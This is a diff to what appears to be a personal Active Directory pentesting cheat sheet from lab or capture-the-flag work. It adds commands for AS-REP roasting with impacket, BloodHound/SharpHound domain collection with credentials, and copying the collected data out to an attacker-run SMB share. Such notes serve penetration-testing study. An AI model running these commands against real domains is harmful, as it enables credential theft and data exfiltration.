@@ -217,6 +217,7 @@ Found Users (with no passwords)
 
 AS-REP Roast 
 Crack Users that dont require creds to request TGT from the KDC (likely a Service Acct) 
+Requires port 88 (kerberos) and usernames to try AS-REP Roasting 
 
 impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
 for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
@@ -334,8 +335,12 @@ copy \\192.168.162.46\share\SharpHound.exe
 copy \\192.168.162.46\share\SharpHound.ps1 
 PS> Import-Module .\SharpHound.ps1 
 PS> Invoke-BloodHound -CollectionMethod All 
+PS> Invoke-Bloodhound -collectionmethod all -domain mike.com -ldapuser svc-acct -ldappass paxxword
 SharpHound.exe --CollectionMethod All  
+smbserver.py share . -smb2support -username mike -password helps
+net use \\192.168.162.46\share /u:mike helps 
 copy 20220118140920_BloodHound.zip \\192.168.162.46\share\  
+net use /d \\192.168.162.46\share 
 
 Remote Bloodhound (needs creds)
 bloodhound.py -c All,LoggedOn -u "bob" -p "paxx" -d mike.com -ns 192.168.200.5
